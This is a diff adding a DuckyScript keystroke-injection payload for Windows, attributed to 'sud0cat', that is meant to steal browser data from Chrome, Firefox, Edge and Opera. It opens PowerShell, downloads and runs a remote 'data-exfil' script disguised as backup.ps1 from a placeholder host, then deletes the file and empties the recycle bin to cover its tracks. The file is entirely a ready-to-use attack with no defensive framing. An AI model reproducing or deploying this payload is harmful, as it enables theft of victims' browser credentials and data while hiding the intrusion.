@@ -1,0 +1,20 @@
+REM Author: sud0cat
+REM Description: obtain browser data (chrome, firefox, edge, opera)
+REM Target: windows
+
+REM open powershell
+GUI r
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 500
+
+REM download and run the data-exfil script
+STRING Invoke-WebRequest -Uri "https://your.domain.com/browser_data_win.ps1" -OutFile "$HOME\Downloads\backup.ps1"; if (Test-Path "$HOME\Downloads\backup.ps1") { & "$HOME\Downloads\backup.ps1" }
+ENTER
+
+REM clean up
+STRING Remove-Item "$HOME\Downloads\backup.ps1" -Force; Clear-RecycleBin -Force; exit
+ENTER 
+
